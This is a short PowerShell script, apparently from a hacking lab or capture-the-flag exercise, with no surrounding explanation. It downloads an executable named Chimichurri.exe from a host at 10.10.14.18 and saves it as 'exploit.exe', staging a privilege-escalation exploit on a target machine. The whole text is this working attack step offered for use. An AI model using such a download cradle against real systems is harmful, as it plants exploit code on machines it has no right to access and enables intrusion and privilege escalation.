$webclient = New-Object System.Net.WebClient
$url = "http://10.10.14.18/Chimichurri.exe"
$file = "exploit.exe"
$webclient.DownloadFile($url, $file)
